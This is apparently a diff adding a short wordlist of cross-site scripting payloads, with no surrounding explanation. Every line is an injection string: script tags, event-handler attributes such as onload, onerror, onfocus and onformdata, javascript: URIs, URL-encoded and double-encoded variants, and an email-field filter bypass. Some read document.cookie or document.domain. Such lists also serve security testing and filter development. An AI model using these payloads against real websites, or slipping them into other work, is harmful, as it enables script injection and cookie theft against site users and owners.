@@ -1,0 +1,10 @@
+#<script>alert(1)</script>
+1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
+"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+#javascript:alert(2);
+"><svg onload=alert(1)>
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E
+//?aspxerrorpath=<script>alert(1)</script>
+嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E
+alert##<script>prompt(1234)</script>
